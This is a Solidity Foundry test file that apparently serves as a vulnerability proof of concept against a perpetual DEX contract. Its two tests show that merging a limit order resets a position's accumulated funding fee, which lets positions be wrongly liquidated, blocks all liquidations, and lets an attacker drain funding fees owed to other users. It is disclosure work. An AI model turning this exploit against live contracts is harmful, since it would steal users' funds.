// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "./PerpDexTestBase.sol";

import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {console} from "forge-std/Test.sol";

using SafeERC20 for IERC20;

contract PerpDexAccFeePerSizeTest is PerpDexTestBase {
    function test_userFundsLoss_and_liquidationRevert() public {
        /**
         * As more time passes since the service launch and the accumulated value of
         * FundingFeeTokenState.accFeePerSize increases, the consequences of this bug
         * become increasingly severe.
         * At the time of 2025-03-28T07:02:34, the accFeePerSize value was 8_388_254_065_175_407_977.
         */
        fundingFeeTokenStates[PerpDexLib.TokenType.Btc].accFeePerSize = 8_388_254_065_175_407_977;

        vm.warp(86_400); // Simulate one day passing
        uint256 positionId1 = openPositionDefault(user, PerpDexLib.TokenType.Btc, 1_000_000_000, 100, true, 100, 0, 0); // 🚀 Open initial position
        uint256 positionId2 = createLimitOrderDefault(PerpDexLib.TokenType.Btc, 1_000_000_000, 20, true, 100, 0, 0); // 🚀 Create a limit order
        PerpDexLib.Position storage positionOld = positions[positionId1];
        PerpDexLib.Position storage limitOrder = positions[positionId2];

        vm.warp(block.timestamp + 86_400); // Simulate another day passing
        vm.prank(owner());
        this.updateFundingFeeStates();
        int256 fundingFeeBefore = PerpDexLib.calculateFundingFee(positionOld, fundingFeeTokenStates[positionOld.tokenType]);
        emit log_named_int("fundingFeeBefore", fundingFeeBefore);

        (PerpDexLib.OraclePrices memory bisonAIData,) = getOraclePricesDefault(6);
        mockGetPreviousPriceAndTime(
            [uint256(100), uint256(100), uint256(100), uint256(100), uint256(100), uint256(100)],
            [block.timestamp, block.timestamp, block.timestamp, block.timestamp, block.timestamp, block.timestamp]
        );

        uint64[] memory roundIds = new uint64[](3);
        uint256[] memory ordersToExecute = new uint256[](1);
        ordersToExecute[0] = positionId2;
        vm.prank(limitAdmin);
        this.executeLimitOrders(ordersToExecute, roundIds, bisonAIData); //  🚀 Executes and merges positionId2 into positionId1

        assertEq(uint256(positionOld.positionStatus), uint256(PerpDexLib.PositionStatus.Open));
        assertEq(uint256(limitOrder.positionStatus), uint256(PerpDexLib.PositionStatus.Merged));
        assertEq(positionOld.accFundingFeePerSize, 0); // 🚨 WRONG

        /**
         * After positionId2 is merged into positionId1, the funding fee becomes so large
         * that the position becomes a target for liquidation.
         * => CRITICAL: This results in a loss of end-user funds, which is an in-scope critical issue.
         */
        int256 fundingFeeAfter = PerpDexLib.calculateFundingFee(positionOld, fundingFeeTokenStates[positionOld.tokenType]);
        emit log_named_int("fundingFeeAfter", fundingFeeAfter);
        emit log_named_uint("positionOld.margin", positionOld.margin);
        assertGe(fundingFeeAfter, fundingFeeBefore);
        assertGe(fundingFeeAfter, int256(positionOld.margin));

        uint256[] memory candidates = new uint256[](1);
        candidates[0] = positionId1;
        vm.warp(block.timestamp + 15); // after few seconds
        mockGetPreviousPriceAndTime( // no price change
            [uint256(100), uint256(100), uint256(100), uint256(100), uint256(100), uint256(100)],
            [block.timestamp, block.timestamp, block.timestamp, block.timestamp, block.timestamp, block.timestamp]
        );

        /**
         * If the funding fee becomes greater than the funding fee buffer balance,
         * liquidation will revert and none of the candidates will be liquidated.
         * => CRITICAL, All liquidation for all users will be reverted. The protocol will not be liquidating anything.
         */
        vm.prank(admin);
        this.depositFundingFeeGlobalStateBalance(956_345_140); // funding fee buffer deposited at that time
        vm.prank(liqAdmin);
        vm.expectRevert("Funding Fee buffer balance is insufficient");
        this.liquidatePositions(candidates, roundIds, bisonAIData);
    }

    // When a user opens a position against the dominant side, the protocol may lose funds.
    function test_protocolFundsLoss() public {
        /**
         * As more time passes since the service launch and the accumulated value of
         * FundingFeeTokenState.accFeePerSize increases, the consequences of this bug
         * become increasingly severe.
         * At the time of 2025-03-28T07:02:34, the accFeePerSize value was 8_388_254_065_175_407_977.
         */
        fundingFeeTokenStates[PerpDexLib.TokenType.Btc].accFeePerSize = 8_388_254_065_175_407_977;

        vm.warp(86_400); // Simulate one day passing
        uint256 positionId1 = openPositionDefault(user, PerpDexLib.TokenType.Btc, 1_000_000_000, 100, false, 100, 0, 0); // 🚀 Open initial position
        uint256 positionId2 = createLimitOrderDefault(PerpDexLib.TokenType.Btc, 1_000_000_000, 20, false, 100, 0, 0); // 🚀 Create a limit order

        PerpDexLib.Position storage positionOld = positions[positionId1];
        PerpDexLib.Position storage limitOrder = positions[positionId2];

        vm.warp(block.timestamp + 86_400); // Simulate another day passing
        vm.prank(owner());
        this.updateFundingFeeStates();
        int256 fundingFeeBefore = PerpDexLib.calculateFundingFee(positionOld, fundingFeeTokenStates[positionOld.tokenType]);
        emit log_named_int("fundingFeeBefore", fundingFeeBefore);

        (PerpDexLib.OraclePrices memory bisonAIData,) = getOraclePricesDefault(6);
        mockGetPreviousPriceAndTime(
            [uint256(100), uint256(100), uint256(100), uint256(100), uint256(100), uint256(100)],
            [block.timestamp, block.timestamp, block.timestamp, block.timestamp, block.timestamp, block.timestamp]
        );

        uint64[] memory roundIds = new uint64[](3);
        uint256[] memory ordersToExecute = new uint256[](1);
        ordersToExecute[0] = positionId2;
        vm.prank(limitAdmin);
        this.executeLimitOrders(ordersToExecute, roundIds, bisonAIData); // 🚀 Executes and merges positionId2 into positionId1

        assertEq(uint256(positionOld.positionStatus), uint256(PerpDexLib.PositionStatus.Open));
        assertEq(uint256(limitOrder.positionStatus), uint256(PerpDexLib.PositionStatus.Merged));
        assertEq(positionOld.accFundingFeePerSize, 0); // 🚨 WRONG

        /**
         * After positionId2 is merged into positionId1, the funding fee becomes significantly large.
         * => CRITICAL: The attacker will gain additional funding fees unfairly
         */
        int256 fundingFeeAfter = PerpDexLib.calculateFundingFee(positionOld, fundingFeeTokenStates[positionOld.tokenType]);
        emit log_named_int("fundingFeeAfter", fundingFeeAfter);
        emit log_named_uint("positionOld.margin", positionOld.margin);
        assertLe(fundingFeeAfter, fundingFeeBefore);

        uint256 marginSum = 0;
        uint256[] memory openPositionIds = this.getOpenPositionIds();
        for (uint256 i = 0; i < openPositionIds.length; i++) {
            marginSum += positions[openPositionIds[i]].margin;
        }

        /**
         * => EXTREMELY CRITICAL, If the attacker drains enough funding fees,
         * the contract will not have enough money to pay back other users' margins.
         * Other users won't be able to close their positions and retrieve their money
         */
        emit log_named_uint("marginSum", marginSum);
        uint256 fundingFeeToGive = uint256(-fundingFeeAfter);
        assertGe(fundingFeeToGive, marginSum);
    }
}
